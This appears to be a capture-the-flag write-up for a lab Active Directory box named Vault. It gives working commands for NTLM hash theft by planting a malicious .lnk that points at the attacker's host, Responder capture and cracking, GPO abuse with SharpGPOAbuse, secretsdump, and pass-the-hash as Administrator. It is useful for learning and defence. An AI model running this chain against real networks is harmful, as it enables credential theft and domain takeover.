#Windows #ActiveDirectory #SMB #NTLMTheft #Responder #NTLMv2 #GPOAbuse #SharpGPOAbuse #SecretsDump #PassTheHash

## Overview

Vault is an Active Directory Domain Controller box where an anonymous-writable SMB share becomes the mechanism for NTLM hash theft. Planting a malicious `.lnk` file in the share and letting Responder capture the NTLMv2 hash from the first user who browses to it gives a domain account. That account has write access to the Default Domain Policy GPO, which SharpGPOAbuse exploits to add it to the local Administrators group, enabling an `impacket-secretsdump` of all domain hashes and a final pass-the-hash as Administrator.

## Recon

### Nmap

```sh
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap          Domain: vault.offsec
445/tcp  open  microsoft-ds
3268/tcp open  ldap          (GlobalCatalog)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

DC hostname: `DC.vault.offsec`. Domain: `vault.offsec`. SMB signing required.

### SMB, Anonymous Read-Write Share

Listing shares without credentials:

```sh
smbclient -L 192.168.180.172

    Sharename       Type  Comment
    ---------       ----  -------
    ADMIN$          Disk  Remote Admin
    C$              Disk  Default share
    DocumentsShare  Disk
    IPC$            IPC   Remote IPC
    NETLOGON        Disk  Logon server share
    SYSVOL          Disk  Logon server share
```

`DocumentsShare` had no comment and was empty. Testing write access via a null session succeeded.

### RID Brute-Force, User Discovery

Without authenticated LDAP access, RID cycling against the DC surfaced one non-default user:

```
1103: VAULT\anirudh (SidTypeUser)
```

## Foothold

### NTLM Theft via Malicious .lnk File in DocumentsShare

An anonymous-writable share that a domain user regularly browses is a coercion opportunity. When Windows Explorer renders a directory containing a `.lnk` file that points to a UNC path, it automatically tries to authenticate to that path, sending NTLMv2 credentials to whoever is listening.

`ntlm_theft.py` generated the malicious shortcut:

```sh
python3 ntlm_theft.py -g lnk -s 192.168.45.244 -f vault
Created: vault/vault.lnk (BROWSE TO FOLDER)
```

Responder was started on the attacker's interface:

```sh
sudo responder -I tun0
```

The `.lnk` was uploaded to DocumentsShare:

```sh
smbclient -U '' \\\\192.168.180.172\\DocumentsShare
smb: \> put vault.lnk
putting file vault.lnk as \vault.lnk (24.3 kb/s)
```

Shortly after, Responder captured an NTLMv2 challenge-response:

```sh
[SMB] NTLMv2-SSP Username : VAULT\anirudh
[SMB] NTLMv2-SSP Hash     : anirudh::VAULT:5348ef068dd4113b:560851A1F7D74ADAEE...
```

> **Why `.lnk` files trigger automatic authentication:** Windows Shell Link files encode a target path. When Explorer renders a folder view, it resolves every shortcut's target to display the icon, including UNC paths. This causes Windows to attempt authentication to the named server using the current user's credentials before any click occurs. The user just has to open the folder; no interaction with the file itself is needed.

The full NTLMv2 hash was cracked with John:

```sh
john hash --wordlist=/usr/share/wordlists/rockyou.txt
SecureHM         (anirudh)
```

Credentials:

```
anirudh : ‹redacted›
```

WinRM access confirmed:

```sh
evil-winrm -u 'anirudh' -p '‹redacted›' -i 192.168.180.172
```

```powershell
*Evil-WinRM* PS C:\Users\anirudh\Desktop> type local.txt
‹redacted›
```

## Privilege Escalation

### BloodHound, Write Access to Default Domain Policy

Running BloodHound remotely:

```sh
bloodhound-python -u anirudh -p ‹redacted› -d vault.offsec -c All -ns 192.168.180.172
```

BloodHound showed `anirudh` had direct write access ("first degree object control") to the **Default Domain Policy** GPO. This GPO applies to all machines in the domain, including the DC itself.

> **What GPO write access means for privilege escalation:** Group Policy Objects control machine configuration for every system they apply to. An account that can write a GPO can add entries to `GptTmpl.inf` under the policy's `SecEdit` directory, modifying things like local group memberships. SharpGPOAbuse automates this by adding a user to the local Administrators group via the GPO's restricted groups setting. When the GPO next refreshes, the DC applies the change, and the attacker's account is a local admin on every machine the GPO targets.

### SharpGPOAbuse, Adding anirudh to Local Admins

```powershell
*Evil-WinRM* PS C:\Users\anirudh\Documents> upload SharpGPOAbuse.exe

.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"

[+] Domain = vault.offsec
[+] Domain Controller = DC.vault.offsec
[+] SID Value of anirudh = S-1-5-21-537427935-490066102-1511301751-1103
[+] GUID of "Default Domain Policy" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
[+] File exists: \\vault.offsec\SysVol\vault.offsec\Policies\{31B2F340...}\Machine\Microsoft\
    Windows NT\SecEdit\GptTmpl.inf
[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
[+] Done!
```

### impacket-secretsdump → Administrator Hash

With anirudh now a local administrator after GPO refresh, `secretsdump` dumped the domain hashes remotely:

```sh
impacket-secretsdump vault.offsec/anirudh:‹redacted›@192.168.180.172

Administrator:500:aad3b435b51404eeaad3b435b51404ee:54ff9c380cf1a80c23467ff51919146e:::
```

## Root / SYSTEM

Pass-the-hash with the Administrator NT hash:

```sh
evil-winrm -u 'Administrator' -H '54ff9c380cf1a80c23467ff51919146e' -i 192.168.180.172
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type proof.txt
‹redacted›
```

## Takeaways

- **Anonymous-writable shares plus Responder equals credential theft with no exploitation.** The user only needs to open the folder containing the `.lnk` file, Windows does the rest automatically.
- **GPO write access on the Default Domain Policy is domain-wide privilege escalation.** Any user with write access to a GPO applied to the DC can add themselves to local Admins on every affected machine. BloodHound surfaces this path under "first degree object control."
- **SharpGPOAbuse makes GPO abuse reliable and repeatable.** It handles the policy version number increment and the correct GptTmpl.inf structure that Active Directory validates on refresh.
- **`SeRestorePrivilege` on a DC is also a viable escalation path** (notes explored the Utilman.exe swap route), but GPO abuse was cleaner and didn't require RDP interaction.
